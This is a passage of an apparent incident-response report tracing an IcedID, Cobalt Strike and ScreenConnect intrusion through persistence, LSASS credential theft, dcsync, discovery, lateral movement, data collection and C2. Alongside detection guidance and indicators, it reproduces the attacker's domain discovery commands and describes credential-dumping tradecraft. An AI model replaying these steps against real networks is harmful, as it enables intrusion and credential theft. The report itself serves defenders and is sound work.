<p>When executed, the tool writes a .NET executable to the %USERPROFILE%\AppData\Local\Temp folder using a .tmp extension and then loads it into memory, as seen in the Sysmon Event ID 7 event:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34736" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-022.png" alt="" width="625" height="351" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-022.png 625w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-022-300x168.png 300w" sizes="(max-width: 625px) 100vw, 625px" /></a></p>





<p>Using dynamic analysis from running the sample in a malware analysis sandbox, we can observe the injected .NET assemblies:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34737" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-023.png" alt="" width="661" height="59" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-023.png 661w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-023-300x27.png 300w" sizes="(max-width: 661px) 100vw, 661px" /></a><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34738" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-024.png" alt="" width="1063" height="345" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-024.png 1063w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-024-300x97.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-024-1024x332.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-024-768x249.png 768w" sizes="(max-width: 1063px) 100vw, 1063px" /></a></p>







<h2 id="persistence" class="wp-block-heading"><a href="#persistence">Persistence</a></h2>



<p class="wp-block-heading"><strong> IcedID</strong></p>



<p>IcedID registered a scheduled task for persistence, in the same manner as documented in <a href="https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/" target="_blank" rel="noreferrer noopener">several</a> other <a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/#persistence" target="_blank" rel="noreferrer noopener">reports</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-025.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34739" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-025.png" alt="" width="935" height="948" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-025.png 935w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-025-296x300.png 296w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-025-768x779.png 768w" sizes="(max-width: 935px) 100vw, 935px" /></a></p>





<p>The task was registered to be executed every hour after logon as indicated respectively by the following XML tags:</p>
<pre>&lt;Interval&gt;PT1H&lt;/Interval&gt; </pre>
<pre>&lt;LogonTrigger id="LogonTrigger"&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/LogonTrigger&gt;</pre>



<p><strong>ScreenConnect</strong></p>



<p>Upon installation, ScreenConnect persists across reboots with an auto-start service. This can be seen using the built-in System event logs (event ID 7045).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34740" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-026.png" alt="" width="447" height="354" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-026.png 447w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-026-300x238.png 300w" sizes="(max-width: 447px) 100vw, 447px" /></a></p>





<p>Should the System event logs be unavailable (for instance if cleared by an threat actor), the service configuration is saved inside the SYSTEM registry file, which can be analyzed using Eric Zimmerman&#8217;s <a href="https://ericzimmerman.github.io/#!index.md" target="_blank" rel="noreferrer noopener">Registry Explorer</a> tool, in the HKLM\CurrentControlSet\Services\ location.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-027.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34741" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-027.png" alt="" width="1429" height="740" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-027.png 1429w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-027-300x155.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-027-1024x530.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-027-768x398.png 768w" sizes="(max-width: 1429px) 100vw, 1429px" /></a></p>





<p>Anomali Threat Research explained the parameters in their <a href="https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies" target="_blank" rel="noreferrer noopener">article</a> :</p>



<ul class="wp-block-list">
<li><em>e</em> as session type, can be <em>Support</em>, <em>Meeting</em>, <em>Access</em>.</li>



<li><em>y</em> as process type, can be <em>Guest</em> or <em>Host</em>.</li>



<li><em>h</em> as the URI to the relay service’s URI.</li>



<li><em>p</em> as the relay service’s port.</li>



<li><em>s</em> as a globally unique identifier for client identification.</li>



<li><em>k</em> as the encoded encryption key, used for identity verification.</li>



<li><em>t</em> as the optional session name.</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34742" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-028.png" alt="" width="725" height="167" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-028.png 725w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-028-300x69.png 300w" sizes="(max-width: 725px) 100vw, 725px" /></a></p>





<h2 id="defense-evasion" class="wp-block-heading"><a href="#defense-evasion">Defense Evasion</a></h2>



<p>Upon moving laterally to a backup server, we observed Cobalt Strike injection into legitimate process &#8220;winlogon.exe&#8221; and &#8220;rundll32.exe&#8221;.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34743" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-029.png" alt="" width="783" height="393" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-029.png 783w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-029-300x151.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-029-768x385.png 768w" sizes="(max-width: 783px) 100vw, 783px" /></a></p>





<p>By relying on memory captures, defenders may also have other detection methods. Here, by processing the acquired memory with <a href="https://github.com/ufrisk/MemProcFS" target="_blank" rel="noreferrer noopener">MemprocFS</a> and using the <a href="https://github.com/ufrisk/MemProcFS/wiki/FS_FindEvil" target="_blank" rel="noreferrer noopener">findevil</a> command, we can find an injected beacon in winlogon.exe.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34744" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-030.png" alt="" width="871" height="89" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-030.png 871w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-030-300x31.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-030-768x78.png 768w" sizes="(max-width: 871px) 100vw, 871px" /></a><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-031.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34745" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-031.png" alt="" width="1503" height="186" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-031.png 1503w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-031-300x37.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-031-1024x127.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-031-768x95.png 768w" sizes="(max-width: 1503px) 100vw, 1503px" /></a></p>







<p>During the intrusion, the threat actor deleted the renamed ScreenConnect installers from the backup server and the file server using the &#8220;del&#8221; command, in an attempt to cover their tracks.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34746" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-032.png" alt="" width="1223" height="398" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-032.png 1223w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-032-300x98.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-032-1024x333.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-032-768x250.png 768w" sizes="(max-width: 1223px) 100vw, 1223px" /></a></p>





<h2 id="credential-access" class="wp-block-heading"><a href="#credential-access">Credential Access</a></h2>



<p>Credentials were extracted from LSASS (Local Security Authority Subsystem), a technique commonly seen during similar intrusions. On day one, through hands-on activity, the threat actor executed cslite.exe (a CSharp Streamer file dropped on the Desktop of a compromised user), which was used to access the LSASS process. Process access can be seen using Sysmon event ID 10, as displayed below.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34747" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-033.png" alt="" width="1311" height="77" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-033.png 1311w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-033-300x18.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-033-1024x60.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-033-768x45.png 768w" sizes="(max-width: 1311px) 100vw, 1311px" /></a></p>





<p><a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights?redirectedfrom=MSDN" target="_blank" rel="noreferrer noopener">Microsoft</a> documented the granted accesses, which are the following:</p>



<ul class="wp-block-list">
<li>0x1010: PROCESS_QUERY_LIMITED_INFORMATION (0x1000) and PROCESS_VM_READ (0x0010)</li>



<li>0x1FFFFF: PROCESS_ALL_ACCESS</li>
</ul>



<p>Another data point to look for is the UNKNOWN string in the CallTrace, which indicates Sysmon was not able to resolve the address of code from where the OpenProcessfunction was called, potential indication of a DLL in memory.</p>



<p>We also were able to collect memory and scan it with various YARA rules, confirming the use of a Mimikatz implementation with several rule hits for the cslite.exe memory space and file:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/10/24952-034-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34818" src="https://thedfirreport.com/wp-content/uploads/2025/10/24952-034-1.png" alt="" width="1232" height="670" srcset="https://thedfirreport.com/wp-content/uploads/2025/10/24952-034-1.png 1232w, https://thedfirreport.com/wp-content/uploads/2025/10/24952-034-1-300x163.png 300w, https://thedfirreport.com/wp-content/uploads/2025/10/24952-034-1-1024x557.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/10/24952-034-1-768x418.png 768w" sizes="(max-width: 1232px) 100vw, 1232px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/10/24952-035-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34819" src="https://thedfirreport.com/wp-content/uploads/2025/10/24952-035-1.png" alt="" width="1285" height="588" srcset="https://thedfirreport.com/wp-content/uploads/2025/10/24952-035-1.png 1285w, https://thedfirreport.com/wp-content/uploads/2025/10/24952-035-1-300x137.png 300w, https://thedfirreport.com/wp-content/uploads/2025/10/24952-035-1-1024x469.png 1024w, https://thedfirreport.com/wp-content/uploads/2025/10/24952-035-1-768x351.png 768w" sizes="(max-width: 1285px) 100vw, 1285px" /></a></p>







<p>In another instance, we saw LSASS being accessed by WerFault.exe, with PROCESS_ALL_ACCESS granted. This should happen rarely in a production environment, and once again, the CallTrace can also help as CallTrace with ntdll.dll, dbghelp.dll or dbgcore.dll (<a href="https://www.elastic.co/guide/en/security/7.17/prebuilt-rule-0-14-3-potential-credential-access-via-lsass-memory-dump.html" target="_blank" rel="noreferrer noopener">source 1</a>, <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/proc_access_win_lsass_werfault.yml" target="_blank" rel="noreferrer noopener">source 2</a>) should be monitored.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34750" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-036.png" alt="" width="1311" height="275" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-036.png 1311w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-036-300x63.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-036-1024x215.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-036-768x161.png 768w" sizes="(max-width: 1311px) 100vw, 1311px" /></a></p>





<p>Finally, on the second day, we can see yet another access to LSASS, this time from rundll32.exe, once again using access 0x1010 and with UNKNOWN in the CallTrace. This time, rundll32.exe was spawned by PowerShell, which was tasked to download and execute a Cobalt Strike beacon.</p>



<p>Around 40 minutes after the LSASS dump by the &#8220;cslite.exe&#8221; executable, we observed a traffic spike from the beachhead host to a domain controller. Reviewing this network traffic using the Suricata rules from <a href="https://blog.nviso.eu/2021/11/15/detecting-dcsync-and-dcshadow-network-traffic/" target="_blank" rel="noreferrer noopener">Didier Stevens</a>, we discovered potential Mimikatz dcsync activity between the hosts.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-037.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34751" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-037.png" alt="" width="1561" height="235" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-037.png 1561w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-037-300x45.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-037-1024x154.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-037-768x116.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-037-1536x231.png 1536w" sizes="(max-width: 1561px) 100vw, 1561px" /></a></p>





<p>At the same time we found Event ID 4662 logs on the domain controller, confirming a sync operation requested by the &#8220;Administrator&#8221; account:</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-038.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34752" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-038.png" alt="" width="1756" height="553" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-038.png 1756w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-038-300x94.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-038-1024x322.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-038-768x242.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-038-1536x484.png 1536w" sizes="(max-width: 1756px) 100vw, 1756px" /></a></figure>



<p>Specifically, we were looking for the <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/c-domaindns" target="_blank" rel="noreferrer noopener">Domain-DNS Class(object) — Schema GUID: 19195a5b-6da0–11d0-afd3–00c04fd930c9</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all" target="_blank" rel="noreferrer noopener">DS-Replication-Get-Changes-All — Schema GUID: 1131f6ad-9c07–11d1-f79f-00c04fc2dcd2</a> as explained in this <a href="https://posts.specterops.io/entity-based-detection-engineering-with-bloodhound-enterprise-b4dce3963d66" target="_blank" rel="noreferrer noopener">SpectreOps post</a>, to detect this dcsync activity. Using these two points of evidence, we can say with good confidence that the threat actor performed a dcsync operation.</p>



<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>



<p>Minutes after the initial compromise, a first round of discovery was observed using native Windows built-in utilities, spawning from the IcedID malware.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-039.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34753" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-039.png" alt="" width="1176" height="218" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-039.png 1176w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-039-300x56.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-039-1024x190.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-039-768x142.png 768w" sizes="(max-width: 1176px) 100vw, 1176px" /></a></figure>



<pre class="wp-block-preformatted">cmd.exe /c chcp &gt;&amp;2
ipconfig /all
systeminfo
net config workstation
nltest /domain_trusts
nltest /domain_trusts /all_trusts
net view /all /domain
net view /all
net group "Domain Admins" /domain
</pre>



<p>Later on, the threat actor used ScreenConnect to run other discovery commands, on several occasions</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-040.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34754" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-040.png" alt="" width="991" height="324" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-040.png 991w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-040-300x98.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-040-768x251.png 768w" sizes="(max-width: 991px) 100vw, 991px" /></a></p>





<pre class="wp-block-preformatted">nltest  /dclist:
net  group "domain admins" /domain
net  group "Domain Computers" /domain
net  group "domain admins" /domain
net  group "enterprise admins" /domain
nltest  /dclist:
net  group "domain admins" /domain
quser
ipconfig  /all
net  group "domain computers" /domain
systeminfo
route  print
nltest  /dclist:
</pre>



<p>On day two, day five, and day eight, the threat actor performed rounds of network discovery using <a href="https://www.softperfect.com/products/networkscanner/" target="_blank" rel="noreferrer noopener">SoftPerfect netscan</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-041.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34755" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-041.png" alt="" width="1179" height="358" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-041.png 1179w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-041-300x91.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-041-1024x311.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-041-768x233.png 768w" sizes="(max-width: 1179px) 100vw, 1179px" /></a></p>





<p>Each time, the scan goes over the same IP address space, and scans for the ports 135 (RPC), 445 (SMB) and 3389 (RDP), with a few extras related to the <a href="https://www.veeam.com" target="_blank" rel="noreferrer noopener">Veeam</a> backup solutions.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34756" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-042.png" alt="" width="371" height="490" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-042.png 371w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-042-227x300.png 227w" sizes="(max-width: 371px) 100vw, 371px" /></a></p>





<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>



<p>The renamed ScreenConnect installer was copied from the beachhead to domain controllers, a backup server, and a file server using SMB. As explained in the <a href="#execution">execution section</a>, the installer was also executed via Impacket&#8217;s wmiexec.py script, which resulted in the ScreenConnect installation. Multiple commands were executed on the compromised hosts via ScreenConnect command functionality.</p>



<p>Event ID 5145 logs:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34757" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-043.png" alt="" width="829" height="509" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-043.png 829w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-043-300x184.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-043-768x472.png 768w" sizes="(max-width: 829px) 100vw, 829px" /></a><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34758" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-044.png" alt="" width="829" height="509" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-044.png 829w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-044-300x184.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-044-768x472.png 768w" sizes="(max-width: 829px) 100vw, 829px" /></a></p>







<p>RDP was used extensively during the intrusion by the threat actor to move laterally.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34759" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-045.png" alt="" width="1864" height="1372" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-045.png 1864w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-045-300x221.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-045-1024x754.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-045-768x565.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-045-1536x1131.png 1536w" sizes="(max-width: 1864px) 100vw, 1864px" /></a></p>





<p>While the threat actor most frequently used the native Windows RDP clients, on at least one occasion they proxied their RDP session via the CSharp Streamer.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34760" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-046.png" alt="" width="607" height="170" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-046.png 607w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-046-300x84.png 300w" sizes="(max-width: 607px) 100vw, 607px" /></a></p>





<p>When doing this, they left a trace of their remote host name logged under Event ID 4778:</p>



<pre class="wp-block-preformatted">77724F2
</pre>



<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-047.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34761" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-047.png" alt="" width="729" height="297" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-047.png 729w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-047-300x122.png 300w" sizes="(max-width: 729px) 100vw, 729px" /></a></p>



<h2 id="collection" class="wp-block-heading"><a href="#collection">Collection</a></h2>



<p>Before initiating the exfiltration process, a custom tool called confucius_cpp.exe was dropped on a file server. This tool was used to aggregate, stage, and compress sensitive data files, using LDAP and creating multiple ZIP archives.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-048.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34762" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-048.png" alt="" width="607" height="188" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-048.png 607w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-048-300x93.png 300w" sizes="(max-width: 607px) 100vw, 607px" /></a></figure>



<p>As seen when executing the tool in a lab environment, the LDAP query with search filter (&amp;(objectClass=computer)) is first made to look for computers, as documented in <a href="https://learn.microsoft.com/en-us/windows/win32/ad/finding-objects-by-class" target="_blank" rel="noreferrer noopener">Microsoft learn website</a>.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-049.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34763" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-049.png" alt="" width="424" height="229" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-049.png 424w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-049-300x162.png 300w" sizes="(max-width: 424px) 100vw, 424px" /></a></figure>



<p>Once the LDAP query is complete, the tool enumerates shared folders, filtering out some uninteresting folders such as NETLOGON or SYSVOL.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-050.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34764" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-050.png" alt="" width="1264" height="789" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-050.png 1264w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-050-300x187.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-050-1024x639.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-050-768x479.png 768w" sizes="(max-width: 1264px) 100vw, 1264px" /></a></figure>



<p>On each selected folder, the tool will look for files based on keywords (in the screenshot they&#8217;re after the words <em>security_reports</em> and <em>finance</em>) before compressing data. This automates the collection phase, ensuring swift action across the whole network.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-051.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34765" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-051.png" alt="" width="1272" height="511" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-051.png 1272w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-051-300x121.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-051-1024x411.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-051-768x309.png 768w" sizes="(max-width: 1272px) 100vw, 1272px" /></a></figure>



<p>The attacker also installed Firefox to preview a few documents. This can be seen by looking at the process command line, which contains the url argument, as displayed below.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-052.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34766" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-052.png" alt="" width="573" height="87" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-052.png 573w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-052-300x46.png 300w" sizes="(max-width: 573px) 100vw, 573px" /></a></figure>
<p>&nbsp;</p>



<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>



<p>The threat actor leveraged the following methods to access the hosts within the network:</p>



<ul class="wp-block-list">
<li>IcedID</li>



<li>Cobalt Strike</li>



<li>CSharp Streamer</li>



<li>ScreenConnect</li>
</ul>
<p><a href="https://thedfirreport.com/wp-content/uploads/2024/06/24952-053.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-34767" src="https://thedfirreport.com/wp-content/uploads/2024/06/24952-053.png" alt="" width="1880" height="1152" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/24952-053.png 1880w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-053-300x184.png 300w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-053-1024x627.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-053-768x471.png 768w, https://thedfirreport.com/wp-content/uploads/2024/06/24952-053-1536x941.png 1536w" sizes="(max-width: 1880px) 100vw, 1880px" /></a></p>





<p><strong>IcedID</strong></p>



<p>The forked IcedID loader established connection to command and control server modalefastnow[.]com over port 443, which resolved at the time to 212.18.104.12. The contents of the network connection matched a malware rule in the Emerging Threats Open ruleset &#8220;ET MALWARE Win32/IcedID Request Cookie&#8221;.</p>



<p>After the initial infection, the second stage IcedID DLL communicated with the following C2 servers:</p>



<figure class="wp-block-table">
<table style="height: 287px;" width="892">
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>Domain</td>
<td>JA3</td>
<td>JA3s</td>
</tr>
<tr>
<td>173.255.204.62</td>
<td>443</td>
<td>jkbarmossen[.]com</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>N/A</td>
</tr>
<tr>
<td>94.232.46.27</td>
<td>443</td>
<td>evinakortu[.]com</td>
<td>a0e9f5d64349fb13191bc781f81f42e1, 1138de370e523e824bbca92d049a3777</td>
<td>N/A</td>
</tr>
<tr>
<td>94.232.46.27</td>
<td>443</td>
<td>hofsaalos[.]com</td>
<td>a0e9f5d64349fb13191bc781f81f42e1<br />1138de370e523e824bbca92d049a3777</td>
<td>N/A</td>
</tr>
<tr>
<td>77.105.140.181</td>
<td>443</td>
<td>jerryposter[.]com</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
</tr>
<tr>
<td>77.105.142.135</td>
<td>443</td>
<td>skrechelres[.]com</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
</tr>
<tr>
<td>212.18.104.12</td>
<td>443</td>
<td>modalefastnow[.]com</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>N/A</td>
</tr>
</tbody>
</table>
</figure>



<p>&nbsp;</p>
<pre>ja4: t12d190800_d83cc789557e_7af1ed941c26<br />ja4: t10d070700_c50f5591e341_c39ab67fec8e<br />ja4s: t120400_c030_12a20535f9be<br />ja4x: 96a6439c8f5c_96a6439c8f5c_795797892f9c</pre>
<p><strong>Cobalt Strike</strong></p>



<p>The threat actor dropped Cobalt Strike beacons across hosts during the intrusion, communicating with the following IP addresses.</p>



<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>Domain</td>
<td>JA3</td>
<td>JA3s</td>
<td>AS Organization</td>
<td>ASN</td>
<td>Geolocation Country</td>
</tr>
<tr>
<td>85.209.11.48</td>
<td>80</td>
<td>N/A</td>
<td>N/A</td>
<td>N/A</td>
<td>Chang Way Technologies Co. Limited</td>
<td>57523</td>
<td>Russia</td>
</tr>
</tbody>
</table>
</figure>



